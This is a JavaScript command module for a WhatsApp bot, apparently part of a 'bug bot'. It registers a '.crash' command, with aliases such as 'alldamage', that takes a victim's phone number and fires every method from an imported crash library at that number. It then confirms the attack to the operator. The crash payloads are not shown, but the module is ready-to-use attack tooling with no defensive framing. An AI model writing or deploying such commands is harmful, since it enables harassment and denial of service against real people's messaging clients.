'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'crash',
    aliases: ['crashall', 'executeall', 'alldamage'],
    category: 'crash',
    desc: 'ᴇxᴇᴄᴜᴛᴇ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
    usage: '.crash <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}crash <number>\n📝 *Example:* ${prefix}crash 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💣 ᴇxᴇᴄᴜᴛɪɴɢ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs...' }, { quoted: msg });
        
        try {
            await crashLib.executeAll(target, msg);
            return sock.sendMessage(ctx.from, { text: '✅ ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};